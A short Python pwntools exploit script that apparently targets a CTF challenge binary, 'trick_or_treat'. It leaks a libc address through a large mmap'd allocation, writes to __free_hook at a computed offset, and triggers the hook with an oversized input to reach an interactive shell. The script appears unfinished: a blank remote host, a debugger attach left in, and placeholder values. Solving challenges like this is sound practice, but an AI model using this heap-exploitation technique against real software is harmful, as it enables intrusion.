from pwn import *

e = ELF("./trick_or_treat")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("", )
else:
  p = process(e.path)

p.sendlineafter(":", str(0x30000))
p.recvuntil("0x")
ori = int(p.recvline() , 16)
leak = ori - 0x7feda42cd010 + 0x00007feda3cf2000 

print("{:#x}".format(leak))

p.sendlineafter(":", hex((leak + libc.symbols["__free_hook"] - ori) / 8) + " " + hex(0x1337))

gdb.attach(p)

p.sendlineafter(":", "A" * 50000 + " ed")

p.interactive()
